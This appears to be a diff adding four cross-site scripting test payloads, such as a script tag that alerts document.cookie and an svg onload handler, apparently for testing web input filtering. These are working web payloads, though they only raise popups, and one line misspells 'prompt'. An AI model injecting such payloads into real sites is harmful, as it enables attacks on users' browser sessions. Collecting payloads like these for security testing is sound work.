@@ -1,0 +1,4 @@
+<b onmouseover=alert('Wufff!')>click me!</b>
+"><script>propmt("mamunwhh")</script>
+"><script>alert(document.cookie)</script>
+/><svg src=x onload=confirm("1337");>
